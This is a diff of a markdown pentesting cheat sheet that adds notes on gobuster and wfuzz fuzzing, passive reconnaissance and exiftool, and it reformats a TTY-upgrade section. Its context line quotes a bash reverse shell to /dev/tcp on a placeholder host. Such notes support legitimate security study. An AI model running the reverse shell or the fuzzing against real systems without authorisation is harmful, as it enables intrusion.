@@ -221,21 +221,50 @@ system("bash -c 'bash -i >& /dev/tcp/IP_YOUR_LOCAL_MACHINE/443 0>&1'")
 `ps -faux`: List running process
 
 `updatedb`
+
 ### FUZZING
+#### GOBUSTER
 `./gobuster dir -u URL -w DICTIONARY -t 200`
 
+#### WFUZZ
 `wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt URL/FUZZ/`
 - -L: redirect
-- --hc: Hide Code# Get a TTY
+- --hc: Hide Code
+- --sc: Show CodeÇ
+- --hw: hide word
 - -t: number of threats
 - w: dictionary
+`Payload type list`
+
+`wfuzz -c --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -z list,html-txt-php URL/FUZZ.FUZ2Z`
+- -z list,html-txt-php: Extensions
+`wfuzz -c -t 200 -z range,1-2000 'URL/id=FUZZ'`
+
+#### FUFF
+
+#### PASSIVE TOOLS
+
+##### PHONEBOOK.cz
+
+#### GOOGLE DORKS
+
+- site:DOMAIN
+
+- pentest-tools.com
+
+#### METADATA FROM DOCS
+
+`exiftool doc.pdf`: Extract the metadata from the document
 
 # Get a TTY
-`script /dev/null -c bash`
-CTRL + Z
-`stty raw -echo; fg`
-`reset xterm`
 
+`script /dev/null -c bash`
+
+CTRL + Z
+
+`stty raw -echo; fg`
+
+`reset xterm`
 
 # Useful commands:
 
